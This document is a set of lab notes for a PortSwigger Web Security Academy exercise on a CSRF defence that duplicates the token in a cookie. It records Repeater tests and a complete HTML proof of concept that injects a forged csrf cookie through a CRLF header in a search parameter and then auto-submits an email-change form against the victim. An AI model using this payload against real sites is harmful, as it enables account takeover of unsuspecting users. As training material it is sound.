```bash
1. login
2. update: email  &&  send this request to the repeater tab

TEST CASE
both the CSRF token and cookie are same
Cookie: session=070ciSVoUcfuKbNkq6R0TZ3ug0uMQnQy; csrf=LAQXGMz6Eg2DW8mxeHcKSkNQdY20n78q
email=firstCHANGE%40mail.com&csrf=LAQXGMz6Eg2DW8mxeHcKSkNQdY20n78q

a. remove the CSRF token only  --  Missing parameter'csrf'
b. now remove the csrf cookie only  --  Invalid CSRF token
c. add an extra string: end: CSRF token or cookie  --  Invalid CSRF token
d. update the value: CSRF token and cookei  --  abcd1234
   Cookie: session=070ciSVoUcfuKbNkq6R0TZ3ug0uMQnQy; csrf=abcd1234 && email=firstCHANGE%40mail.com&csrf=abcd1234  --  302 Found

3. navigate: home page: search a string  --  RESPONSE  HTTP/2 200 OK Set-Cookie: LastSearchTerm=apple; Secure; HttpOnly

YOU CAN ALSO SOLVE THIS LAB BY WRITTING A FAKE CSRF TOKEN AND COOKIE  --  then their is no need to intercept the request

4. update the wiener's email while intercepting the request
5. send to the repeater and turn off the intercept, also drop all the request
6. generate a CSRF PoC  --  update the email value

CSRF PAYLOAD

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="anotherCHANGE@mail.com">
			<input type="hidden" name="csrf" value="LAQXGMz6Eg2DW8mxeHcKSkNQdY20n78q">
			<input type="submit" value="Submit Request">
		</form>
		<img src="https://lab-id.web-security-academy.net/?search=apple%0d%0aSet-Cookie:%20csrf=LAQXGMz6Eg2DW8mxeHcKSkNQdY20n78q%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body>
</html>


POST ANALYSIS
src="payload"  --  https://lab-id.web-security-academy.net/?search=apple Set-Cookie: csrf=LAQXGMz6Eg2DW8mxeHcKSkNQdY20n78q; SameSite=None

7. press the back button of the browser  --  do not refresh the browser
8. go to the exploit server deliver to the victim and done
9. NOTE if you viewed the exploit then update the email value
```
